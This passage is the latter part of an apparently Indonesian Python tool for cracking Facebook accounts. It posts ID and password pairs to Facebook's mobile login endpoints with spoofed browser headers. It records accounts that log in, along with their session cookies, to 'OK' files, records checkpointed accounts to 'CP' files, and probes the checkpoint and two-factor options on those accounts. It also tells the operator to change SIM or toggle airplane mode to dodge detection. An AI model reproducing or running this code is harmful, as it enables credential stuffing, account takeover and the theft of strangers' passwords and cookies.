bhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree("    ")

				tree.add(f"{K}Checkpoint").add(f"{K}{idf}|{pw}")

				tree.add(f"{U}{ua}{P}")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("   ")

				tree.add(f"{H}SUKSES").add(f"{H}{idf}|{pw}")

				tree.add(f"{H}{kuki}{P}")
				tree.add(f"{U}{ua}{P}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
        global cp
        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
        head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        ses = requests.Session()
        try:
                hi = ses.get('https://mbasic.facebook.com')
                ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
                jo = ho.find('form')
                data = {}
                lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                for anj in jo('input'):
                        if anj.get('name') in lion:
                                data.update({anj.get('name'):anj.get('value')})
                kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
                opsi = kent.find_all('option')
                if len(opsi)==0:
                        print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                else:
                        for opsii in opsi:
                                print('\r%s---> %s%s'%(kk,opsii.text,x))
        except Exception as c:
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
        c = len(akun)
        hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
        cetak(nel(hu, title='CEK OPSI'))
        input(x+'['+h+'•'+x+'] Mulai')
        cek = '# PROSES CEK OPSI DIMULAI'
        sol().print(mark(cek, style='green'))
        love = 0
        for kes in akun:
                try:
                        try:
                                id,pw = kes.split('|')[0],kes.split('|')[1]
                        except IndexError:
                                time.sleep(2)
                                print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
                                print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
                                continue
                        bi = random.choice([u,k,kk,b,h,hh])
                        print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
                        ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
                        ses = requests.Session()
                        header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                        hi = ses.get('https://mbasic.facebook.com')
                        ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
                        if "checkpoint" in ses.cookies.get_dict().keys():
                                try:
                                        jo = ho.find('form')
                                        data = {}
                                        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                                        for anj in jo('input'):
                                                if anj.get('name') in lion:
                                                        data.update({anj.get('name'):anj.get('value')})
                                        kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                                        opsi = kent.find_all('option')
                                        if len(opsi)==0:
                                                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                                        else:
                                                for opsii in opsi:
                                                        print('\r%s---> %s%s'%(kk,opsii.text,x))
                                except:
                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                                        print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
                        elif "c_user" in ses.cookies.get_dict().keys():
                                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
                        else:
                                print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
                        love+=1
                except requests.exceptions.ConnectionError:
                        print('')
                        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                        sol().print(mark(li, style='red'))
                        exit()
        dah = '# DONE'
        sol().print(mark(dah, style='green'))
        exit()

#--------[ SYSTEM-CONTROL ]-------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	login()
	
	
#THANKS TO PRA-XD
#AUTHOR BY PRA-XD